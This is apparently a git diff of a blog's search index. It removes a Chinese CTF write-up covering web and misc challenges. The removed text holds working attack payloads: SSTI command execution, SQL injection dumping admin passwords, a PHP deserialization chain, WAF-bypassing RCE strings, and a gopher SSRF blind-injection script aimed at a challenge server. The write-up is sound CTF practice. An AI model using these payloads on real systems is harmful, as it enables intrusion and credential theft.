@@ -1,12 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>简介</title>
-    <url>/2023/01/13/%E7%AE%80%E4%BB%8B/</url>
-    <content><![CDATA[<p><b>欢迎！</b><br>这里是林涂！很高兴认识你！<br>本人间歇性发疯中。。。</p>
-]]></content>
-  </entry>
-  <entry>
     <title>CTF-After-Dark-Winter-2023部分wp</title>
     <url>/2023/03/02/CTF-After-Dark-Winter-2023%E9%83%A8%E5%88%86wp/</url>
     <content><![CDATA[<p>CTF After Dark Winter 2023的部分wp</p>
@@ -81,298 +75,6 @@
       </tags>
   </entry>
   <entry>
-    <title>ROIS冬令营第三周至第五周WriteUp</title>
-    <url>/2023/02/15/ROIS%E5%86%AC%E4%BB%A4%E8%90%A5%E7%AC%AC%E4%B8%89%E5%91%A8%E8%87%B3%E7%AC%AC%E4%BA%94%E5%91%A8WriteUp/</url>
-    <content><![CDATA[<p>ROIS冬令营第三周至第五周WriteUp（更了misc的两题</p>
-<span id="more"></span>
-<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Week3-SSTItest"><a href="#Week3-SSTItest" class="headerlink" title="[Week3]SSTItest"></a>[Week3]SSTItest</h3><p>payload：<code>username=&#123;&#123;lipsum.__globals__["os"].popen("tac ../flag").read()&#125;&#125;&amp;password=1</code></p>
-<h3 id="LinTu的留言板sql注入"><a href="#LinTu的留言板sql注入" class="headerlink" title="LinTu的留言板sql注入"></a>LinTu的留言板sql注入</h3><p>测试（以下第一行都在id处输入，第二行都在留言处输入</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;,&#x27;2&#x27;)#</span><br><span class="line">11</span><br></pre></td></tr></table></figure>
-<p>输出：<code>1 说 2</code></p>
-<p>查当前库名</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;,database())#</span><br><span class="line">11</span><br></pre></td></tr></table></figure>
-<p>输出：<code>1 说 test</code></p>
-<p>查库名</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;,(select group_concat(schema_name) from information_schema.schemata))#</span><br><span class="line">11</span><br></pre></td></tr></table></figure>
-<p>输出：<code>1 说 mysql,information_schema,performance_schema,sys,sakila,world,test</code></p>
-<p>查表名</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;test&#x27;))#</span><br><span class="line">11</span><br></pre></td></tr></table></figure>
-<p>输出：<code>1 说 guestbook,user</code></p>
-<p>查字段</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;,(select group_concat(concat_ws(&#x27;:&#x27;,username,password)) from test.user))#</span><br><span class="line">11</span><br></pre></td></tr></table></figure>
-<p>输出admin及其密码</p>
-<h3 id="Week4-babyphp"><a href="#Week4-babyphp" class="headerlink" title="[Week4]babyphp"></a>[Week4]babyphp</h3><p>刚开头给的函数是backdoor函数，传入六个参数，但是在下面的代码里面，除了在popko类中，其他的并没有调用这个backdoor函数<br>由题意得，我们应该用到这个backdoor函数</p>
-<p>按顺序捋捋应该是：</p>
-<ol>
-<li>首先是传入一个c，当c中不包含字符串<code>popko</code>，就会反序列化c中的字符串；</li>
-<li>反序列化后会调用popko类中的__destruct函数；</li>
-<li>popko类中的__destruct函数中又会调用pipimi类中的__destruct函数；</li>
-<li>__destruct函数中会调用backdoor函数；</li>
-</ol>
-<hr>
-<ol>
-<li><p>首先，构造一个可以被反序列化的字符串c，利用反序列化漏洞，构造一个可以调用backdoor()函数的对象，利用 Popko 类，Popko类有一个 __call() 函数，当left和right值相同，且md5和sha1值相同，它会调用backdoor()函数。</p>
-</li>
-<li><p>然后，利用 pipimi 类，构造一个可以调用 Popko 类的对象，利用 pipimi 类来构造，调用 Popko 类的 a 函数，从而调用 Popko 类的 __call() 函数。</p>
-</li>
-<li><p>然后，构造出c后就可以调用backdoor()函数；</p>
-</li>
-</ol>
-<p>构造c</p>
-<ol>
-<li>传入popkp：php是一种弱语言，strstr()对大小写敏感，可以用Popko大写绕过这样。。</li>
-<li>left和right值相同，且md5和sha1值相同：数组传参；</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$popko=new popko();</span><br><span class="line">$pipimi=new pipimi();</span><br><span class="line">$right[]=1;</span><br><span class="line">$left[]=2;</span><br><span class="line">$popko-&gt;right=$right;</span><br><span class="line">$popko-&gt;left=$left;</span><br><span class="line">$pipimi-&gt;a=$popko;</span><br><span class="line">echo serialize($pipimi);</span><br></pre></td></tr></table></figure>
-<ol start="3">
-<li>得到<code>O:6:&quot;pipimi&quot;:1:&#123;s:1:&quot;a&quot;;O:5:&quot;popko&quot;:2:&#123;s:4:&quot;left&quot;;a:1:&#123;i:0;i:2;&#125;s:5:&quot;right&quot;;a:1:&#123;i:0;i:1;&#125;&#125;&#125;</code>改<code>POPKO</code></li>
-<li>绕过__wakeup()：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行，2改3；</li>
-<li>成功调用backdoor函数。</li>
-</ol>
-<hr>
-<ol>
-<li><p><code>&amp;a=Error</code>Error类；</p>
-</li>
-<li><p><code>&amp;b=systemcat%20/f*</code>指定b的值为systemcat &#x2F;f*，这是一个命令，它会搜索当前目录下所有以.f结尾的文件。</p>
-</li>
-<li><p><code>&amp;d=7&amp;e=6&amp;f=13&amp;g=7</code>指定d，e，f和g的值为7，6，13和7，它们是用来指定Popko类的实例的left和right属性的字符串长度的。</p>
-</li>
-</ol>
-<p><code>?c=O:6:&quot;pipimi&quot;:1:&#123;s:1:&quot;a&quot;;O:5:&quot;POPKO&quot;:3:&#123;s:4:&quot;left&quot;;a:1:&#123;i:0;i:1;&#125;s:5:&quot;right&quot;;a:1:&#123;i:0;i:2;&#125;&#125;&#125;&amp;a=Error&amp;b=systemcat%20/f*&amp;d=7&amp;e=6&amp;f=13&amp;g=7</code></p>
-<h3 id="Week4-cachewaf"><a href="#Week4-cachewaf" class="headerlink" title="[Week4]cachewaf"></a>[Week4]cachewaf</h3><p>&#96;cmd&#x3D;system(‘ls’);发现被过滤，经过测试是system被过滤。</p>
-<p>搜个无数字字母rce的，<code>cmd=$%DF=(_/_._)[0];$_=%2B%2B$%DF ;$%DE=_;$%DE.=%2B%2B$_.$%DF;$_%2B%2B ;$_%2B%2B;$%DE.=%2B%2B$_;$%DE.=%2B%2B$_;$$%DE [0]($$%DE [_]);&amp;0=system&amp;_=echo 1111;</code></p>
-<p>然后<code>cmd=$%DF=(_/_._)[0];$_=%2B%2B$%DF ;$%DE=_;$%DE.=%2B%2B$_.$%DF;$_%2B%2B ;$_%2B%2B;$%DE.=%2B%2B$_;$%DE.=%2B%2B$_;$$%DE [0]($$%DE [_]);&amp;0=system&amp;_=ls /</code>把&#x2F;目录下的文件和目录列出来。</p>
-<p>但是在<code>cmd=$%DF=(_/_._)[0];$_=%2B%2B$%DF ;$%DE=_;$%DE.=%2B%2B$_.$%DF;$_%2B%2B ;$_%2B%2B;$%DE.=%2B%2B$_;$%DE.=%2B%2B$_;$$%DE [0]($$%DE [_]);&amp;0=system&amp;_=cat /f*</code>提取flag时，flag是错的。</p>
-<p>输入<code>cmd=$%DF=(_/_._)[0];$_=%2B%2B$%DF ;$%DE=_;$%DE.=%2B%2B$_.$%DF;$_%2B%2B ;$_%2B%2B;$%DE.=%2B%2B$_;$%DE.=%2B%2B$_;$$%DE [0]($$%DE [_]);&amp;0=system&amp;_=cat waf*</code>发现flag会被替换并且被编码。</p>
-<p>。。。然后。。。利用shelI写文件绕过waf这部分还在捋捋。。。但是看到了wp给出的非预期解（？）。。。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=echo `ls /`;</span><br><span class="line">cmd=echo `cat /f?ag`;</span><br><span class="line">cmd=echo bin2hex(`cat /f?ag`);</span><br></pre></td></tr></table></figure>
-<p>然后hex解一下就好</p>
-<h3 id="Week4-internal"><a href="#Week4-internal" class="headerlink" title="[Week4]internal"></a>[Week4]internal</h3><p>由sqli可以知道真实的地址要在它服务端本地发出的，才能够进行sql查询。。<br>由ssrf提示可得，可以利用gopher协议，构造一个数据包然后传进去，使服务器以为是本地发送的请求。<br>构建如下：<br><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2</code></p>
-<p>然后利用id进行传参。。</p>
-<p>空格可以用<code>/**/</code>替换，但是不知道为什么我<code>&quot;un&quot;+&quot;ion&quot;</code>构建不成功，试了大小写双写内联注释URL编码都不行。。。好吧只能一个一个布尔盲注一下<br><strong>查库名</strong><br>库名长度为3<br><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2/**/and/**/(length(database())=3)</code></p>
-<p>库名第一个字符ASCII值为114(r)<br><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2/**/and/**/(ASCII(SUBSTR(database(),1,1))=114)</code></p>
-<p>同理可得,第二个字符是(u)，第三个是(a)<br><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2/**/and/**/(ASCII(SUBSTR(database(),2,1))=117)</code></p>
-<p><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2/**/and/**/(ASCII(SUBSTR(database(),3,1))=97)</code></p>
-<p>即，数据库名为rua。</p>
-<p><strong>查表名</strong><br>求当前数据库存在的表的数量<br>当前数据库存在2个表<br><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2/**/and/**/(select/**/count(table_name)/**/from/**/information_schema.`TABLES`/**/where/**/table_schema/**/=/**/database())/**/=/**/2</code></p>
-<p>查表长度，为4<br><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2/**/and/**/(LENGTH((select/**/table_name/**/from/**/information_schema.`TABLES`/**/where/**/table_schema/**/=/**/database()/**/LIMIT/**/0,1)/**/))/**/=/**/4</code></p>
-<p>表名第一个字符ASCII值为102(f)<br><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2/**/and/**/ASCII(SUBSTR((select/**/table_name/**/FROM/**/information_schema.`TABLES`/**/where/**/table_schema/**/=/**/database()/**/LIMIT/**/0,1),1,1))=102</code></p>
-<p>同理可得，第二个字符是(l)，第三个是(a)，第四个是(g)<br><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2/**/and/**/ASCII(SUBSTR((select/**/table_name/**/FROM/**/information_schema.`TABLES`/**/where/**/table_schema/**/=/**/database()/**/LIMIT/**/0,1),2,1))=108</code></p>
-<p><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2/**/and/**/ASCII(SUBSTR((select/**/table_name/**/FROM/**/information_schema.`TABLES`/**/where/**/table_schema/**/=/**/database()/**/LIMIT/**/0,1),3,1))=97</code></p>
-<p><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2/**/and/**/ASCII(SUBSTR((select/**/table_name/**/FROM/**/information_schema.`TABLES`/**/where/**/table_schema/**/=/**/database()/**/LIMIT/**/0,1),4,1))=103</code></p>
-<p>即，表名是flag。</p>
-<p><strong>求列名</strong><br>求表中列的数量(1个)<br><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2/**/and/**/(select/**/count(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/=/**/&quot;flag&quot;)/**/=/**/1</code></p>
-<p>求表中列的长度，4有输出5没有，所以长度是4<br><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2/**/and/**/ASCII(SUBSTR((select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name/**/=/**/&quot;flag&quot;/**/limit/**/0,1),4,1))</code></p>
-<p>第一个字母ASCII值为102(f)<br><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2/**/and/**/ASCII(SUBSTR((select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name/**/=/**/&quot;flag&quot;/**/limit/**/0,1),1,1))=102</code><br>同理，列名是flag</p>
-<p><strong>求字段</strong><br>求字段数，只有一个。。。很好<br><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2/**/and/**/(select/**/count(flag)/**/from/**/flag)=1</code></p>
-<p>求字段长度，24有输出25没有，所以长度是24<br><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2/**/and/**/ASCII(SUBSTR((select/**/flag/**/from/**/flag/**/limit/**/0,1),24,1))</code></p>
-<p>然后。。就一个一个的字符的。。试。。或者burp爆破。。再动上一点小脑筋。。。。<br>24个字符扣掉<code>ROIS&#123;&#125;</code>还有18个。。没有很多。。<br><img src="https://img.mjj.today/2023/02/11/b244fea670d1fd320360c67fd6e2fb96.png" alt="b244fea670d1fd320360c67fd6e2fb96.png"><br>最后解得flag的值</p>
-<p>学长给了个python的</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="comment">#导入urllib.parse模块，用于对url进行编码</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#导入requests模块，用于发送http请求</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fuck</span>():</span><br><span class="line"><span class="comment">#定义一个函数，名称为fuck</span></span><br><span class="line">    url = <span class="string">&quot;http://101.43.57.52:43083/curl.php&quot;</span></span><br><span class="line">    <span class="comment">#定义一个url变量，用于存储要发送请求的url</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="comment">#定义一个result变量，用于存储最终查询到的结果</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1290</span>):</span><br><span class="line">    <span class="comment">#使用for循环，循环次数为1290次，循环变量i从1开始</span></span><br><span class="line">        head = <span class="number">32</span></span><br><span class="line">        <span class="comment">#定义一个head变量，用于存储字符的ASCII码的范围，初始值为32，对应空格</span></span><br><span class="line">        tail = <span class="number">127</span></span><br><span class="line">        <span class="comment">#定义一个tail变量，用于存储字符的ASCII码的范围，初始值为127，对应~</span></span><br><span class="line">        <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        <span class="comment">#使用while循环，当head小于tail时，循环继续</span></span><br><span class="line">            mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">            <span class="comment">#定义一个mid变量，用于存储字符的ASCII码的中间值，等于head和tail的平均值</span></span><br><span class="line">            sqli = <span class="string">&quot;1/**/and/**/if(ascii(substr((seleCt(group_concat(schema_name))from(information_schema.schemata)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">            <span class="comment">#查库名</span></span><br><span class="line">            sqli = <span class="string">&quot;1/**/and/**/if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;rua&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">            <span class="comment">#查表名</span></span><br><span class="line">            sqli = <span class="string">&quot;1/**/and/**/if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;flag&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">            <span class="comment">#查列名</span></span><br><span class="line">            sqli = <span class="string">&quot;1/**/and/**/if(ascii(substr((seLect(flag)from(rua.flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">            <span class="comment">#查字段</span></span><br><span class="line">            <span class="built_in">id</span> = urllib.parse.quote(sqli)</span><br><span class="line">            <span class="comment">#使用urllib.parse.quote方法对sqli变量进行编码</span></span><br><span class="line">            id_length = <span class="built_in">len</span>(<span class="built_in">id</span>)+<span class="number">3</span></span><br><span class="line">            <span class="comment">#定义一个id_length变量，用于存储编码后的sqli语句的长度</span></span><br><span class="line">            payload = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">POST /sqli.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Length: <span class="subst">&#123;id_length&#125;</span></span></span><br><span class="line"><span class="string">Cache-Control: max-age=0</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">id=<span class="subst">&#123;<span class="built_in">id</span>&#125;</span></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#定义一个payload变量，用于存储构造的http请求</span></span><br><span class="line"><span class="comment"># print(payload)：打印payload变量，用于查看构造的http请求</span></span><br><span class="line">            tmp = urllib.parse.quote(payload)</span><br><span class="line">            <span class="comment">#使用urllib.parse.quote方法对payload变量进行编码</span></span><br><span class="line">            new = tmp.replace(<span class="string">&quot;%0A&quot;</span>,<span class="string">&quot;%0D%0A&quot;</span>)</span><br><span class="line">            <span class="comment">#使用replace方法对编码后的payload变量进行替换，将%0A替换为%0D%0A</span></span><br><span class="line">            res = <span class="string">&#x27;gopher://127.0.0.1:80/_&#x27;</span> + new</span><br><span class="line">            <span class="comment">#定义一个res变量，用于存储替换后的payload变量</span></span><br><span class="line">            dataa = &#123;</span><br><span class="line">                <span class="string">&quot;url&quot;</span>:res</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">#定义一个dataa变量，用于存储要发送的数据</span></span><br><span class="line">            r = requests.post(url=url,data=dataa)</span><br><span class="line">            <span class="comment">#使用requests.post方法发送http请求，url参数为url变量，data参数为dataa变量</span></span><br><span class="line">            <span class="comment"># print(r.text)：打印r.text，用于查看返回的内容</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;meow meow meow&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="comment">#如果返回内容中包含&quot;meow meow meow&quot;字符串，则执行if语句中的内容</span></span><br><span class="line">                head=mid+<span class="number">1</span></span><br><span class="line">                <span class="comment">#将head变量设置为mid+1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment">#如果返回内容中不包含&quot;meow meow meow&quot;字符串，则执行else语句中的内容</span></span><br><span class="line">                tail=mid</span><br><span class="line">                <span class="comment">#将tail变量设置为mid</span></span><br><span class="line">        <span class="keyword">if</span> head !=<span class="number">32</span>:</span><br><span class="line">        <span class="comment">#如果head变量不等于32，则执行if语句中的内容</span></span><br><span class="line">            result+=<span class="built_in">chr</span>(head)</span><br><span class="line">            <span class="comment">#将head变量对应的字符添加到result变量中</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment">#如果head变量等于32，则执行else语句中的内容</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            <span class="comment">#跳出for循环</span></span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">        <span class="comment">#打印result变量，用于查看最终查询到的结果</span></span><br><span class="line">fuck()</span><br><span class="line"><span class="comment">#执行fuck函数</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="福到了"><a href="#福到了" class="headerlink" title="福到了"></a>福到了</h3><ol>
-<li>png图片用winhex或010 Editor打开，可以在最末端IEND区后发现一个<code>DM</code>（但是因为不知道怎么用，很长一段时间没重视它（</li>
-<li>Stegsolve可以看到R、G、B的0通道左上角和下面一排均有隐写痕迹，根据提取出来的<code>fudaole</code>的信息，可得，将图片翻转（这图不仅倒了还反了。。</li>
-<li>翻转后再次用Stegsolve打开，r0&#x2F;g0&#x2F;b0均有504B开头数据，是zip文件头格式，保存为zip，打开压缩包，里面是一个叫binary的文件</li>
-<li>学长给了hint是<code>DM</code>是个缩写，和一个关键词：“barcode”</li>
-<li>可以联系到DM是DataMatrix的缩写</li>
-<li>用winhex打开binary，观察十六进制数值可以发现开头是<code>AAAA..</code>结尾是<code>FFFF..</code></li>
-<li>文件名联想二进制转换可得开头是<code>101010..</code>结尾是<code>111111..</code></li>
-<li>研究DataMatrix形式可得其最上面一行和最右边一行是黑白格相间，最下面一行和最左边一行是全黑格，跟二进制数值有相符的地方，由此推测出用二进制绘制DataMatrix</li>
-</ol>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">binary_value=<span class="built_in">bin</span>(<span class="number">0xAAAAAAAAA92FA88BA664D1E08EDFA2479912C45CC2A3DD25ED44DA1E8EAFFA6BD154C732A32BCE0BC65491D4A8C9BB1B9110C150E223DD4DD46E8C5EFFFFFFFFAAAAAAAAAAA99283B152D446A2B3D145E74ED7E48885992B9D60A662AB77A05FFC649666CA53AD43B48EC59EBF119825EAF2A2EC82A7B4BBB256E5E6FFFFFFFF</span>)</span><br><span class="line"></span><br><span class="line">binary_string=binary_value[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(binary_string)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(binary_string))</span><br><span class="line"><span class="comment"># 1024=32x32</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将字符串转换为二维数组</span></span><br><span class="line">binary_list = [binary_string[i:i+<span class="number">32</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary_string), <span class="number">32</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将二进制转换为黑白图案</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(binary_list)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(binary_list[i])):</span><br><span class="line">        <span class="keyword">if</span> binary_list[i][j] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;██&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;  &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br></pre></td></tr></table></figure>
-<ol start="10">
-<li>出来的DataMatrix码找个网站扫扫，即为flag</li>
-</ol>
-<h3 id="ez-gugugu"><a href="#ez-gugugu" class="headerlink" title="ez_gugugu"></a>ez_gugugu</h3><ol>
-<li><p>将gugugu.jpg用winhex打开后发现尾部有<code>PK</code>和<code>flag.txt</code>字样</p>
-</li>
-<li><p>分离</p>
-<p> 用binwalk打开<br> <code>python binwalk -e gugugu.jpg</code><br> 输出</p>
- <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             JPEG image data, JFIF standard 1.01</span><br><span class="line">102642        0x190F2         End of Zip archive, footer length: 22</span><br></pre></td></tr></table></figure>
-<p> 分离zip文件<br> <code>python binwalk -D &quot;zip archive:zip&quot; gugugu.jpg</code><br> 我自己做时应该还能用，不知道为什么写wp时分离不成功了</p>
-<p> 或者在winhex里搜索十六进制数值<code>FFD9</code>，复制其后面的十六进制，发现zip文件头损坏，补上<code>504B</code>，粘贴为zip文件保存</p>
-</li>
-<li><p>zip压缩包提示有密码</p>
-</li>
-</ol>
-<p>根据encode.py写</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">f1 = Image.<span class="built_in">open</span>(<span class="string">&quot;next.png&quot;</span>)</span><br><span class="line">f1 = f1.convert(<span class="string">&quot;RGB&quot;</span>)</span><br><span class="line">f2 = Image.<span class="built_in">open</span>(<span class="string">&quot;ff.png&quot;</span>)</span><br><span class="line">f2 = f2.convert(<span class="string">&quot;RGB&quot;</span>)</span><br><span class="line">new = Image.new(<span class="string">&quot;RGB&quot;</span>, f2.size)</span><br><span class="line">h = f2.height</span><br><span class="line">w = f2.width</span><br><span class="line"><span class="built_in">print</span>(h)</span><br><span class="line"><span class="built_in">print</span>(w)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(w):</span><br><span class="line">        r1, g1, b1 = f1.getpixel((j, i))</span><br><span class="line">        r2, g2, b2 = f2.getpixel((j, i))</span><br><span class="line">        new.putpixel((w-j-<span class="number">1</span>, h-i-<span class="number">1</span>), (r1 ^ g2, g1 ^ b2, b1 ^ r2))</span><br><span class="line">new.save(<span class="string">&quot;flag.png&quot;</span>)</span><br></pre></td></tr></table></figure>
-<ol start="4">
-<li>在flag.png上得到压缩包密码，打开压缩包，得到flag</li>
-</ol>
-]]></content>
-      <categories>
-        <category>做题记录</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>web</tag>
-        <tag>misc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>《图解密码技术》读书笔记</title>
-    <url>/2023/01/28/%E3%80%8A%E5%9B%BE%E8%A7%A3%E5%AF%86%E7%A0%81%E6%8A%80%E6%9C%AF%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<p>不会吧不会吧不会真有人连读书笔记都往网上发吧</p>
-<span id="more"></span>
-<p>读《图解密码技术》ing。。<br>还挺有意思的这本书。。找了个图床贴点图片。。希望图片不会裂掉。。</p>
-<p><img src="https://img.mjj.today/2023/01/28/33fad240cf463b69695e9ec84f106339.png" alt="33fad240cf463b69695e9ec84f106339.png"></p>
-<p>记点可能有用的。。</p>
-<h1 id="第一部分：密码"><a href="#第一部分：密码" class="headerlink" title="第一部分：密码"></a>第一部分：密码</h1><h2 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h2><blockquote>
